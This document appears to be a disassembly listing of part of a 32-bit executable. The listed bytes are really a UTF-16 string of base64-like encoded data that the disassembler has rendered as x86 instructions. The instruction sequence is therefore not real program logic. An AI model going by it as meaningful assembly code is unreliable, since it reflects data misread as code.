  40a705:	00 46 00             	add    %al,0x0(%esi)
  40a708:	63 00                	arpl   %eax,(%eax)
  40a70a:	71 00                	jno    0x40a70c
  40a70c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a70d:	00 6a 00             	add    %ch,0x0(%edx)
  40a710:	36 00 77 00          	add    %dh,%ss:0x0(%edi)
  40a714:	2b 00                	sub    (%eax),%eax
  40a716:	6c                   	insb   (%dx),%es:(%edi)
  40a717:	00 70 00             	add    %dh,0x0(%eax)
  40a71a:	76 00                	jbe    0x40a71c
  40a71c:	47                   	inc    %edi
  40a71d:	00 51 00             	add    %dl,0x0(%ecx)
  40a720:	38 00                	cmp    %al,(%eax)
  40a722:	52                   	push   %edx
  40a723:	00 55 00             	add    %dl,0x0(%ebp)
  40a726:	42                   	inc    %edx
  40a727:	00 58 00             	add    %bl,0x0(%eax)
  40a72a:	77 00                	ja     0x40a72c
  40a72c:	6c                   	insb   (%dx),%es:(%edi)
  40a72d:	00 79 00             	add    %bh,0x0(%ecx)
  40a730:	55                   	push   %ebp
  40a731:	00 7a 00             	add    %bh,0x0(%edx)
  40a734:	42                   	inc    %edx
  40a735:	00 56 00             	add    %dl,0x0(%esi)
  40a738:	78 00                	js     0x40a73a
  40a73a:	7a 00                	jp     0x40a73c
  40a73c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a73d:	00 63 00             	add    %ah,0x0(%ebx)
  40a740:	57                   	push   %edi
  40a741:	00 77 00             	add    %dh,0x0(%edi)
  40a744:	71 00                	jno    0x40a746
  40a746:	73 00                	jae    0x40a748
  40a748:	4f                   	dec    %edi
  40a749:	00 64 00 4f          	add    %ah,0x4f(%eax,%eax,1)
  40a74d:	00 52 00             	add    %dl,0x0(%edx)
  40a750:	2f                   	das
  40a751:	00 57 00             	add    %dl,0x0(%edi)
  40a754:	66 00 6e 00          	data16 add %ch,0x0(%esi)
  40a758:	78 00                	js     0x40a75a
  40a75a:	75 00                	jne    0x40a75c
  40a75c:	32 00                	xor    (%eax),%al
  40a75e:	77 00                	ja     0x40a760
  40a760:	51                   	push   %ecx
  40a761:	00 72 00             	add    %dh,0x0(%edx)
  40a764:	2f                   	das
  40a765:	00 67 00             	add    %ah,0x0(%edi)
  40a768:	62 00                	bound  %eax,(%eax)
  40a76a:	39 00                	cmp    %eax,(%eax)
  40a76c:	32 00                	xor    (%eax),%al
  40a76e:	68 00 58 00 4b       	push   $0x4b005800
  40a773:	00 73 00             	add    %dh,0x0(%ebx)
  40a776:	30 00                	xor    %al,(%eax)
  40a778:	7a 00                	jp     0x40a77a
  40a77a:	32 00                	xor    (%eax),%al
  40a77c:	52                   	push   %edx
  40a77d:	00 65 00             	add    %ah,0x0(%ebp)
  40a780:	44                   	inc    %esp
  40a781:	00 4a 00             	add    %cl,0x0(%edx)
  40a784:	50                   	push   %eax
  40a785:	00 33                	add    %dh,(%ebx)
  40a787:	00 64 00 36          	add    %ah,0x36(%eax,%eax,1)
  40a78b:	00 74 00 47          	add    %dh,0x47(%eax,%eax,1)
  40a78f:	00 64 00 36          	add    %ah,0x36(%eax,%eax,1)
  40a793:	00 59 00             	add    %bl,0x0(%ecx)
  40a796:	48                   	dec    %eax
  40a797:	00 48 00             	add    %cl,0x0(%eax)
  40a79a:	77 00                	ja     0x40a79c
  40a79c:	39 00                	cmp    %eax,(%eax)
  40a79e:	61                   	popa
  40a79f:	00 47 00             	add    %al,0x0(%edi)
  40a7a2:	70 00                	jo     0x40a7a4
  40a7a4:	7a 00                	jp     0x40a7a6
  40a7a6:	6c                   	insb   (%dx),%es:(%edi)
  40a7a7:	00 56 00             	add    %dl,0x0(%esi)
  40a7aa:	57                   	push   %edi
  40a7ab:	00 7a 00             	add    %bh,0x0(%edx)
  40a7ae:	4f                   	dec    %edi
  40a7af:	00 57 00             	add    %dl,0x0(%edi)
  40a7b2:	71 00                	jno    0x40a7b4
  40a7b4:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
  40a7b8:	55                   	push   %ebp
  40a7b9:	00 49 00             	add    %cl,0x0(%ecx)
  40a7bc:	73 00                	jae    0x40a7be
  40a7be:	2b 00                	sub    (%eax),%eax
  40a7c0:	6f                   	outsl  %ds:(%esi),(%dx)
  40a7c1:	00 42 00             	add    %al,0x0(%edx)
  40a7c4:	79 00                	jns    0x40a7c6
  40a7c6:	61                   	popa
  40a7c7:	00 41 00             	add    %al,0x0(%ecx)
  40a7ca:	4d                   	dec    %ebp
  40a7cb:	00 31                	add    %dh,(%ecx)
  40a7cd:	00 6f 00             	add    %ch,0x0(%edi)
  40a7d0:	4c                   	dec    %esp
  40a7d1:	00 71 00             	add    %dh,0x0(%ecx)
  40a7d4:	64 00 71 00          	add    %dh,%fs:0x0(%ecx)
  40a7d8:	35 00 30 00 41       	xor    $0x41003000,%eax
  40a7dd:	00 7a 00             	add    %bh,0x0(%edx)
  40a7e0:	62 00                	bound  %eax,(%eax)
  40a7e2:	4f                   	dec    %edi
  40a7e3:	00 57 00             	add    %dl,0x0(%edi)
  40a7e6:	54                   	push   %esp
  40a7e7:	00 2f                	add    %ch,(%edi)
  40a7e9:	00 31                	add    %dh,(%ecx)
  40a7eb:	00 48 00             	add    %cl,0x0(%eax)
  40a7ee:	58                   	pop    %eax
  40a7ef:	00 61 00             	add    %ah,0x0(%ecx)
  40a7f2:	59                   	pop    %ecx
  40a7f3:	00 50 00             	add    %dl,0x0(%eax)
  40a7f6:	74 00                	je     0x40a7f8
  40a7f8:	4f                   	dec    %edi
  40a7f9:	00 31                	add    %dh,(%ecx)
  40a7fb:	00 55 00             	add    %dl,0x0(%ebp)
  40a7fe:	67 00 43 00          	add    %al,0x0(%bp,%di)
  40a802:	6a 00                	push   $0x0
  40a804:	65 00 4b 00          	add    %cl,%gs:0x0(%ebx)
  40a808:	45                   	inc    %ebp
  40a809:	00 78 00             	add    %bh,0x0(%eax)
  40a80c:	44                   	inc    %esp
  40a80d:	00 2b                	add    %ch,(%ebx)
  40a80f:	00 53 00             	add    %dl,0x0(%ebx)
  40a812:	78 00                	js     0x40a814
  40a814:	74 00                	je     0x40a816
  40a816:	38 00                	cmp    %al,(%eax)
  40a818:	46                   	inc    %esi
  40a819:	00 68 00             	add    %ch,0x0(%eax)
  40a81c:	38 00                	cmp    %al,(%eax)
  40a81e:	39 00                	cmp    %eax,(%eax)
  40a820:	69 00 45 00 6f 00    	imul   $0x6f0045,(%eax),%eax
  40a826:	36 00 77 00          	add    %dh,%ss:0x0(%edi)
  40a82a:	32 00                	xor    (%eax),%al
  40a82c:	2f                   	das
  40a82d:	00 65 00             	add    %ah,0x0(%ebp)
  40a830:	4b                   	dec    %ebx
  40a831:	00 51 00             	add    %dl,0x0(%ecx)
  40a834:	63 00                	arpl   %eax,(%eax)
  40a836:	6f                   	outsl  %ds:(%esi),(%dx)
  40a837:	00 69 00             	add    %ch,0x0(%ecx)
  40a83a:	73 00                	jae    0x40a83c
  40a83c:	67 00 57 00          	add    %dl,0x0(%bx)
  40a840:	44                   	inc    %esp
  40a841:	00 77 00             	add    %dh,0x0(%edi)
  40a844:	4d                   	dec    %ebp
  40a845:	00 72 00             	add    %dh,0x0(%edx)
  40a848:	47                   	inc    %edi
  40a849:	00 5a 00             	add    %bl,0x0(%edx)
  40a84c:	39 00                	cmp    %eax,(%eax)
  40a84e:	73 00                	jae    0x40a850
  40a850:	4c                   	dec    %esp
  40a851:	00 79 00             	add    %bh,0x0(%ecx)
  40a854:	6c                   	insb   (%dx),%es:(%edi)
  40a855:	00 32                	add    %dh,(%edx)
  40a857:	00 4a 00             	add    %cl,0x0(%edx)
  40a85a:	57                   	push   %edi
  40a85b:	00 4d 00             	add    %cl,0x0(%ebp)
  40a85e:	58                   	pop    %eax
  40a85f:	00 78 00             	add    %bh,0x0(%eax)
  40a862:	50                   	push   %eax
  40a863:	00 42 00             	add    %al,0x0(%edx)
  40a866:	75 00                	jne    0x40a868
  40a868:	76 00                	jbe    0x40a86a
  40a86a:	64 00 54 00 39       	add    %dl,%fs:0x39(%eax,%eax,1)
  40a86f:	00 41 00             	add    %al,0x0(%ecx)
  40a872:	56                   	push   %esi
  40a873:	00 61 00             	add    %ah,0x0(%ecx)
  40a876:	55                   	push   %ebp
  40a877:	00 4a 00             	add    %cl,0x0(%edx)
  40a87a:	50                   	push   %eax
  40a87b:	00 5a 00             	add    %bl,0x0(%edx)
  40a87e:	55                   	push   %ebp
  40a87f:	00 49 00             	add    %cl,0x0(%ecx)
  40a882:	74 00                	je     0x40a884
  40a884:	4b                   	dec    %ebx
  40a885:	00 58 00             	add    %bl,0x0(%eax)
  40a888:	37                   	aaa
  40a889:	00 55 00             	add    %dl,0x0(%ebp)
  40a88c:	4c                   	dec    %esp
  40a88d:	00 58 00             	add    %bl,0x0(%eax)
  40a890:	50                   	push   %eax
  40a891:	00 49 00             	add    %cl,0x0(%ecx)
  40a894:	76 00                	jbe    0x40a896
  40a896:	77 00                	ja     0x40a898
  40a898:	4f                   	dec    %edi
  40a899:	00 50 00             	add    %dl,0x0(%eax)
  40a89c:	43                   	inc    %ebx
  40a89d:	00 48 00             	add    %cl,0x0(%eax)
  40a8a0:	4d                   	dec    %ebp
  40a8a1:	00 46 00             	add    %al,0x0(%esi)
  40a8a4:	7a 00                	jp     0x40a8a6
  40a8a6:	48                   	dec    %eax
  40a8a7:	00 4c 00 41          	add    %cl,0x41(%eax,%eax,1)
  40a8ab:	00 33                	add    %dh,(%ebx)
  40a8ad:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  40a8b1:	00 48 00             	add    %cl,0x0(%eax)
  40a8b4:	38 00                	cmp    %al,(%eax)
  40a8b6:	74 00                	je     0x40a8b8
  40a8b8:	65 00 4c 00 2b       	add    %cl,%gs:0x2b(%eax,%eax,1)
  40a8bd:	00 6e 00             	add    %ch,0x0(%esi)
  40a8c0:	66 00 2f             	data16 add %ch,(%edi)
  40a8c3:	00 52 00             	add    %dl,0x0(%edx)
  40a8c6:	78 00                	js     0x40a8c8
  40a8c8:	36 00 31             	add    %dh,%ss:(%ecx)
  40a8cb:	00 74 00 5a          	add    %dh,0x5a(%eax,%eax,1)
  40a8cf:	00 67 00             	add    %ah,0x0(%edi)
  40a8d2:	6a 00                	push   $0x0
  40a8d4:	45                   	inc    %ebp
  40a8d5:	00 32                	add    %dh,(%edx)
  40a8d7:	00 6d 00             	add    %ch,0x0(%ebp)
  40a8da:	4e                   	dec    %esi
  40a8db:	00 4a 00             	add    %cl,0x0(%edx)
  40a8de:	30 00                	xor    %al,(%eax)
  40a8e0:	4c                   	dec    %esp
  40a8e1:	00 61 00             	add    %ah,0x0(%ecx)
  40a8e4:	4b                   	dec    %ebx
  40a8e5:	00 33                	add    %dh,(%ebx)
  40a8e7:	00 2b                	add    %ch,(%ebx)
  40a8e9:	00 32                	add    %dh,(%edx)
  40a8eb:	00 4c 00 72          	add    %cl,0x72(%eax,%eax,1)
  40a8ef:	00 6d 00             	add    %ch,0x0(%ebp)
  40a8f2:	44                   	inc    %esp
  40a8f3:	00 36                	add    %dh,(%esi)
  40a8f5:	00 75 00             	add    %dh,0x0(%ebp)
  40a8f8:	79 00                	jns    0x40a8fa
  40a8fa:	38 00                	cmp    %al,(%eax)
  40a8fc:	58                   	pop    %eax
  40a8fd:	00 4a 00             	add    %cl,0x0(%edx)
  40a900:	55                   	push   %ebp
  40a901:	00 37                	add    %dh,(%edi)
  40a903:	00 35 00 78 00 79    	add    %dh,0x79007800
  40a909:	00 65 00             	add    %ah,0x0(%ebp)
  40a90c:	54                   	push   %esp
  40a90d:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a910:	48                   	dec    %eax
  40a911:	00 64 00 76          	add    %ah,0x76(%eax,%eax,1)
  40a915:	00 75 00             	add    %dh,0x0(%ebp)
  40a918:	6a 00                	push   $0x0
  40a91a:	54                   	push   %esp
  40a91b:	00 56 00             	add    %dl,0x0(%esi)
  40a91e:	2b 00                	sub    (%eax),%eax
  40a920:	44                   	inc    %esp
  40a921:	00 2f                	add    %ch,(%edi)
  40a923:	00 77 00             	add    %dh,0x0(%edi)
  40a926:	6f                   	outsl  %ds:(%esi),(%dx)
  40a927:	00 4a 00             	add    %cl,0x0(%edx)
  40a92a:	6d                   	insl   (%dx),%es:(%edi)
  40a92b:	00 49 00             	add    %cl,0x0(%ecx)
  40a92e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a92f:	00 39                	add    %bh,(%ecx)
  40a931:	00 31                	add    %dh,(%ecx)
  40a933:	00 64 00 44          	add    %ah,0x44(%eax,%eax,1)
  40a937:	00 68 00             	add    %ch,0x0(%eax)
  40a93a:	4c                   	dec    %esp
  40a93b:	00 43 00             	add    %al,0x0(%ebx)
  40a93e:	71 00                	jno    0x40a940
  40a940:	47                   	inc    %edi
  40a941:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a944:	78 00                	js     0x40a946
  40a946:	7a 00                	jp     0x40a948
  40a948:	74 00                	je     0x40a94a
  40a94a:	76 00                	jbe    0x40a94c
  40a94c:	4c                   	dec    %esp
  40a94d:	00 6c 00 77          	add    %ch,0x77(%eax,%eax,1)
  40a951:	00 63 00             	add    %ah,0x0(%ebx)
  40a954:	34 00                	xor    $0x0,%al
  40a956:	4d                   	dec    %ebp
  40a957:	00 2f                	add    %ch,(%edi)
  40a959:	00 50 00             	add    %dl,0x0(%eax)
  40a95c:	35 00 36 00 58       	xor    $0x58003600,%eax
  40a961:	00 68 00             	add    %ch,0x0(%eax)
  40a964:	42                   	inc    %edx
  40a965:	00 73 00             	add    %dh,0x0(%ebx)
  40a968:	69 00 2b 00 75 00    	imul   $0x75002b,(%eax),%eax
  40a96e:	45                   	inc    %ebp
  40a96f:	00 77 00             	add    %dh,0x0(%edi)
  40a972:	48                   	dec    %eax
  40a973:	00 4a 00             	add    %cl,0x0(%edx)
  40a976:	6f                   	outsl  %ds:(%esi),(%dx)
  40a977:	00 70 00             	add    %dh,0x0(%eax)
  40a97a:	67 00 43 00          	add    %al,0x0(%bp,%di)
  40a97e:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  40a982:	4e                   	dec    %esi
  40a983:	00 6a 00             	add    %ch,0x0(%edx)
  40a986:	69 00 67 00 35 00    	imul   $0x350067,(%eax),%eax
  40a98c:	67 00 34             	add    %dh,(%si)
  40a98f:	00 59 00             	add    %bl,0x0(%ecx)
  40a992:	67 00 2b             	add    %ch,(%bp,%di)
  40a995:	00 38                	add    %bh,(%eax)
  40a997:	00 72 00             	add    %dh,0x0(%edx)
  40a99a:	4c                   	dec    %esp
  40a99b:	00 49 00             	add    %cl,0x0(%ecx)
  40a99e:	6c                   	insb   (%dx),%es:(%edi)
  40a99f:	00 4f 00             	add    %cl,0x0(%edi)
  40a9a2:	49                   	dec    %ecx
  40a9a3:	00 50 00             	add    %dl,0x0(%eax)
  40a9a6:	4e                   	dec    %esi
  40a9a7:	00 59 00             	add    %bl,0x0(%ecx)
  40a9aa:	30 00                	xor    %al,(%eax)
  40a9ac:	6e                   	outsb  %ds:(%esi),(%dx)
  40a9ad:	00 43 00             	add    %al,0x0(%ebx)
  40a9b0:	42                   	inc    %edx
  40a9b1:	00 73 00             	add    %dh,0x0(%ebx)
  40a9b4:	57                   	push   %edi
  40a9b5:	00 75 00             	add    %dh,0x0(%ebp)
  40a9b8:	54                   	push   %esp
  40a9b9:	00 44 00 7a          	add    %al,0x7a(%eax,%eax,1)
  40a9bd:	00 76 00             	add    %dh,0x0(%esi)
  40a9c0:	73 00                	jae    0x40a9c2
  40a9c2:	77 00                	ja     0x40a9c4
  40a9c4:	6b 00 59             	imul   $0x59,(%eax),%eax
  40a9c7:	00 45 00             	add    %al,0x0(%ebp)
  40a9ca:	46                   	inc    %esi
  40a9cb:	00 57 00             	add    %dl,0x0(%edi)
  40a9ce:	6e                   	outsb  %ds:(%esi),(%dx)
  40a9cf:	00 7a 00             	add    %bh,0x0(%edx)
  40a9d2:	2f                   	das
  40a9d3:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
  40a9d7:	00 39                	add    %bh,(%ecx)
  40a9d9:	00 78 00             	add    %bh,0x0(%eax)
  40a9dc:	78 00                	js     0x40a9de
  40a9de:	7a 00                	jp     0x40a9e0
  40a9e0:	70 00                	jo     0x40a9e2
  40a9e2:	61                   	popa
  40a9e3:	00 46 00             	add    %al,0x0(%esi)
  40a9e6:	66 00 77 00          	data16 add %dh,0x0(%edi)
  40a9ea:	64 00 67 00          	add    %ah,%fs:0x0(%edi)
  40a9ee:	2b 00                	sub    (%eax),%eax
  40a9f0:	7a 00                	jp     0x40a9f2
  40a9f2:	69 00 4d 00 75 00    	imul   $0x75004d,(%eax),%eax
  40a9f8:	4b                   	dec    %ebx
  40a9f9:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a9fc:	4a                   	dec    %edx
  40a9fd:	00 5a 00             	add    %bl,0x0(%edx)
  40aa00:	4c                   	dec    %esp
  40aa01:	00 66 00             	add    %ah,0x0(%esi)
  40aa04:	65 00 58 00          	add    %bl,%gs:0x0(%eax)
  40aa08:	46                   	inc    %esi
  40aa09:	00 42 00             	add    %al,0x0(%edx)
  40aa0c:	2b 00                	sub    (%eax),%eax
  40aa0e:	4f                   	dec    %edi
  40aa0f:	00 6b 00             	add    %ch,0x0(%ebx)
  40aa12:	35 00 4b 00 6b       	xor    $0x6b004b00,%eax
  40aa17:	00 74 00 76          	add    %dh,0x76(%eax,%eax,1)
  40aa1b:	00 41 00             	add    %al,0x0(%ecx)
  40aa1e:	44                   	inc    %esp
  40aa1f:	00 46 00             	add    %al,0x0(%esi)
  40aa22:	4e                   	dec    %esi
  40aa23:	00 4c 00 4c          	add    %cl,0x4c(%eax,%eax,1)
  40aa27:	00 6e 00             	add    %ch,0x0(%esi)
  40aa2a:	65 00 6c 00 69       	add    %ch,%gs:0x69(%eax,%eax,1)
  40aa2f:	00 39                	add    %bh,(%ecx)
  40aa31:	00 68 00             	add    %ch,0x0(%eax)
  40aa34:	50                   	push   %eax
  40aa35:	00 61 00             	add    %ah,0x0(%ecx)
  40aa38:	36 00 72 00          	add    %dh,%ss:0x0(%edx)
  40aa3c:	35 00 46 00 62       	xor    $0x62004600,%eax
  40aa41:	00 4a 00             	add    %cl,0x0(%edx)
  40aa44:	53                   	push   %ebx
  40aa45:	00 53 00             	add    %dl,0x0(%ebx)
  40aa48:	76 00                	jbe    0x40aa4a
  40aa4a:	79 00                	jns    0x40aa4c
  40aa4c:	46                   	inc    %esi
  40aa4d:	00 75 00             	add    %dh,0x0(%ebp)
  40aa50:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa51:	00 7a 00             	add    %bh,0x0(%edx)
  40aa54:	65 00 36             	add    %dh,%gs:(%esi)
  40aa57:	00 6c 00 2b          	add    %ch,0x2b(%eax,%eax,1)
  40aa5b:	00 78 00             	add    %bh,0x0(%eax)
  40aa5e:	41                   	inc    %ecx
  40aa5f:	00 63 00             	add    %ah,0x0(%ebx)
  40aa62:	4d                   	dec    %ebp
  40aa63:	00 47 00             	add    %al,0x0(%edi)
  40aa66:	64 00 2b             	add    %ch,%fs:(%ebx)
  40aa69:	00 76 00             	add    %dh,0x0(%esi)
  40aa6c:	7a 00                	jp     0x40aa6e
  40aa6e:	47                   	inc    %edi
  40aa6f:	00 68 00             	add    %ch,0x0(%eax)
  40aa72:	58                   	pop    %eax
  40aa73:	00 31                	add    %dh,(%ecx)
  40aa75:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  40aa79:	00 6e 00             	add    %ch,0x0(%esi)
  40aa7c:	54                   	push   %esp
  40aa7d:	00 65 00             	add    %ah,0x0(%ebp)
  40aa80:	37                   	aaa
  40aa81:	00 47 00             	add    %al,0x0(%edi)
  40aa84:	4e                   	dec    %esi
  40aa85:	00 56 00             	add    %dl,0x0(%esi)
  40aa88:	63 00                	arpl   %eax,(%eax)
  40aa8a:	4e                   	dec    %esi
  40aa8b:	00 42 00             	add    %al,0x0(%edx)
  40aa8e:	73 00                	jae    0x40aa90
  40aa90:	68 00 63 00 4a       	push   $0x4a006300
  40aa95:	00 43 00             	add    %al,0x0(%ebx)
  40aa98:	68 00 4c 00 65       	push   $0x65004c00
  40aa9d:	00 41 00             	add    %al,0x0(%ecx)
  40aaa0:	66 00 4e 00          	data16 add %cl,0x0(%esi)
  40aaa4:	34 00                	xor    $0x0,%al
  40aaa6:	73 00                	jae    0x40aaa8
  40aaa8:	57                   	push   %edi
  40aaa9:	00 57 00             	add    %dl,0x0(%edi)
  40aaac:	45                   	inc    %ebp
  40aaad:	00 42 00             	add    %al,0x0(%edx)
  40aab0:	50                   	push   %eax
  40aab1:	00 64 00 71          	add    %ah,0x71(%eax,%eax,1)
  40aab5:	00 45 00             	add    %al,0x0(%ebp)
  40aab8:	6d                   	insl   (%dx),%es:(%edi)
  40aab9:	00 63 00             	add    %ah,0x0(%ebx)
  40aabc:	76 00                	jbe    0x40aabe
  40aabe:	76 00                	jbe    0x40aac0
  40aac0:	47                   	inc    %edi
  40aac1:	00 4b 00             	add    %cl,0x0(%ebx)
  40aac4:	69 00 64 00 71 00    	imul   $0x710064,(%eax),%eax
  40aaca:	6a 00                	push   $0x0
  40aacc:	32 00                	xor    (%eax),%al
  40aace:	59                   	pop    %ecx
  40aacf:	00 48 00             	add    %cl,0x0(%eax)
  40aad2:	58                   	pop    %eax
  40aad3:	00 38                	add    %bh,(%eax)
  40aad5:	00 4e 00             	add    %cl,0x0(%esi)
  40aad8:	37                   	aaa
  40aad9:	00 33                	add    %dh,(%ebx)
  40aadb:	00 36                	add    %dh,(%esi)
  40aadd:	00 6e 00             	add    %ch,0x0(%esi)
  40aae0:	55                   	push   %ebp
  40aae1:	00 4f 00             	add    %cl,0x0(%edi)
  40aae4:	30 00                	xor    %al,(%eax)
  40aae6:	79 00                	jns    0x40aae8
  40aae8:	6a 00                	push   $0x0
  40aaea:	6d                   	insl   (%dx),%es:(%edi)
  40aaeb:	00 66 00             	add    %ah,0x0(%esi)
  40aaee:	63 00                	arpl   %eax,(%eax)
  40aaf0:	6f                   	outsl  %ds:(%esi),(%dx)
  40aaf1:	00 65 00             	add    %ah,0x0(%ebp)
  40aaf4:	44                   	inc    %esp
  40aaf5:	00 4c 00 39          	add    %cl,0x39(%eax,%eax,1)
  40aaf9:	00 41 00             	add    %al,0x0(%ecx)
  40aafc:	68 00 62 00 63       	push   $0x63006200
  40ab01:	00 70 00             	add    %dh,0x0(%eax)
  40ab04:	66 00 49 00          	data16 add %cl,0x0(%ecx)
  40ab08:	32 00                	xor    (%eax),%al
  40ab0a:	74 00                	je     0x40ab0c
  40ab0c:	6d                   	insl   (%dx),%es:(%edi)
  40ab0d:	00 45 00             	add    %al,0x0(%ebp)
  40ab10:	46                   	inc    %esi
  40ab11:	00 53 00             	add    %dl,0x0(%ebx)
  40ab14:	37                   	aaa
  40ab15:	00 2f                	add    %ch,(%edi)
  40ab17:	00 4c 00 5a          	add    %cl,0x5a(%eax,%eax,1)
  40ab1b:	00 54 00 75          	add    %dl,0x75(%eax,%eax,1)
  40ab1f:	00 37                	add    %dh,(%edi)
  40ab21:	00 42 00             	add    %al,0x0(%edx)
  40ab24:	38 00                	cmp    %al,(%eax)
  40ab26:	74 00                	je     0x40ab28
  40ab28:	74 00                	je     0x40ab2a
  40ab2a:	34 00                	xor    $0x0,%al
  40ab2c:	38 00                	cmp    %al,(%eax)
  40ab2e:	55                   	push   %ebp
  40ab2f:	00 75 00             	add    %dh,0x0(%ebp)
  40ab32:	43                   	inc    %ebx
  40ab33:	00 61 00             	add    %ah,0x0(%ecx)
  40ab36:	78 00                	js     0x40ab38
  40ab38:	62 00                	bound  %eax,(%eax)
  40ab3a:	48                   	dec    %eax
  40ab3b:	00 48 00             	add    %cl,0x0(%eax)
  40ab3e:	70 00                	jo     0x40ab40
  40ab40:	56                   	push   %esi
  40ab41:	00 55 00             	add    %dl,0x0(%ebp)
  40ab44:	30 00                	xor    %al,(%eax)
  40ab46:	2b 00                	sub    (%eax),%eax
  40ab48:	2f                   	das
  40ab49:	00 55 00             	add    %dl,0x0(%ebp)
  40ab4c:	48                   	dec    %eax
  40ab4d:	00 55 00             	add    %dl,0x0(%ebp)
  40ab50:	79 00                	jns    0x40ab52
  40ab52:	6c                   	insb   (%dx),%es:(%edi)
  40ab53:	00 43 00             	add    %al,0x0(%ebx)
  40ab56:	30 00                	xor    %al,(%eax)
  40ab58:	48                   	dec    %eax
  40ab59:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  40ab5d:	00 73 00             	add    %dh,0x0(%ebx)
  40ab60:	6b 00 38             	imul   $0x38,(%eax),%eax
  40ab63:	00 54 00 38          	add    %dl,0x38(%eax,%eax,1)
  40ab67:	00 77 00             	add    %dh,0x0(%edi)
  40ab6a:	72 00                	jb     0x40ab6c
  40ab6c:	55                   	push   %ebp
  40ab6d:	00 4c 00 73          	add    %cl,0x73(%eax,%eax,1)
  40ab71:	00 63 00             	add    %ah,0x0(%ebx)
  40ab74:	75 00                	jne    0x40ab76
  40ab76:	30 00                	xor    %al,(%eax)
  40ab78:	45                   	inc    %ebp
  40ab79:	00 68 00             	add    %ch,0x0(%eax)
  40ab7c:	79 00                	jns    0x40ab7e
  40ab7e:	6d                   	insl   (%dx),%es:(%edi)
  40ab7f:	00 50 00             	add    %dl,0x0(%eax)
  40ab82:	79 00                	jns    0x40ab84
  40ab84:	4e                   	dec    %esi
  40ab85:	00 58 00             	add    %bl,0x0(%eax)
  40ab88:	4c                   	dec    %esp
  40ab89:	00 58 00             	add    %bl,0x0(%eax)
  40ab8c:	6a 00                	push   $0x0
  40ab8e:	75 00                	jne    0x40ab90
  40ab90:	72 00                	jb     0x40ab92
  40ab92:	41                   	inc    %ecx
  40ab93:	00 6b 00             	add    %ch,0x0(%ebx)
  40ab96:	67 00 73 00          	add    %dh,0x0(%bp,%di)
  40ab9a:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab9b:	00 5a 00             	add    %bl,0x0(%edx)
  40ab9e:	62 00                	bound  %eax,(%eax)
  40aba0:	58                   	pop    %eax
  40aba1:	00 4b 00             	add    %cl,0x0(%ebx)
  40aba4:	66 00 63 00          	data16 add %ah,0x0(%ebx)
  40aba8:	4b                   	dec    %ebx
  40aba9:	00 34 00             	add    %dh,(%eax,%eax,1)
  40abac:	78 00                	js     0x40abae
  40abae:	39 00                	cmp    %eax,(%eax)
  40abb0:	39 00                	cmp    %eax,(%eax)
  40abb2:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
  40abb6:	58                   	pop    %eax
  40abb7:	00 38                	add    %bh,(%eax)
  40abb9:	00 39                	add    %bh,(%ecx)
  40abbb:	00 5a 00             	add    %bl,0x0(%edx)
  40abbe:	78 00                	js     0x40abc0
  40abc0:	38 00                	cmp    %al,(%eax)
  40abc2:	74 00                	je     0x40abc4
  40abc4:	33 00                	xor    (%eax),%eax
  40abc6:	69 00 31 00 52 00    	imul   $0x520031,(%eax),%eax
  40abcc:	62 00                	bound  %eax,(%eax)
  40abce:	61                   	popa
  40abcf:	00 31                	add    %dh,(%ecx)
  40abd1:	00 6d 00             	add    %ch,0x0(%ebp)
  40abd4:	37                   	aaa
  40abd5:	00 37                	add    %dh,(%edi)
  40abd7:	00 56 00             	add    %dl,0x0(%esi)
  40abda:	79 00                	jns    0x40abdc
  40abdc:	77 00                	ja     0x40abde
  40abde:	30 00                	xor    %al,(%eax)
  40abe0:	74 00                	je     0x40abe2
  40abe2:	31 00                	xor    %eax,(%eax)
  40abe4:	6f                   	outsl  %ds:(%esi),(%dx)
  40abe5:	00 54 00 78          	add    %dl,0x78(%eax,%eax,1)
  40abe9:	00 6d 00             	add    %ch,0x0(%ebp)
  40abec:	39 00                	cmp    %eax,(%eax)
  40abee:	76 00                	jbe    0x40abf0
  40abf0:	58                   	pop    %eax
  40abf1:	00 37                	add    %dh,(%edi)
  40abf3:	00 33                	add    %dh,(%ebx)
  40abf5:	00 52 00             	add    %dl,0x0(%edx)
  40abf8:	33 00                	xor    (%eax),%eax
  40abfa:	74 00                	je     0x40abfc
  40abfc:	67 00 58 00          	add    %bl,0x0(%bx,%si)
  40ac00:	2f                   	das
  40ac01:	00 63 00             	add    %ah,0x0(%ebx)
  40ac04:	30 00                	xor    %al,(%eax)
  40ac06:	53                   	push   %ebx
  40ac07:	00 4d 00             	add    %cl,0x0(%ebp)
  40ac0a:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac0b:	00 47 00             	add    %al,0x0(%edi)
  40ac0e:	56                   	push   %esi
  40ac0f:	00 63 00             	add    %ah,0x0(%ebx)
  40ac12:	32 00                	xor    (%eax),%al
  40ac14:	71 00                	jno    0x40ac16
  40ac16:	32 00                	xor    (%eax),%al
  40ac18:	56                   	push   %esi
  40ac19:	00 75 00             	add    %dh,0x0(%ebp)
  40ac1c:	63 00                	arpl   %eax,(%eax)
  40ac1e:	46                   	inc    %esi
  40ac1f:	00 7a 00             	add    %bh,0x0(%edx)
  40ac22:	34 00                	xor    $0x0,%al
  40ac24:	37                   	aaa
  40ac25:	00 47 00             	add    %al,0x0(%edi)
  40ac28:	74 00                	je     0x40ac2a
  40ac2a:	35 00 33 00 53       	xor    $0x53003300,%eax
  40ac2f:	00 66 00             	add    %ah,0x0(%esi)
  40ac32:	6a 00                	push   $0x0
  40ac34:	73 00                	jae    0x40ac36
  40ac36:	66 00 52 00          	data16 add %dl,0x0(%edx)
  40ac3a:	43                   	inc    %ebx
  40ac3b:	00 57 00             	add    %dl,0x0(%edi)
  40ac3e:	50                   	push   %eax
  40ac3f:	00 54 00 71          	add    %dl,0x71(%eax,%eax,1)
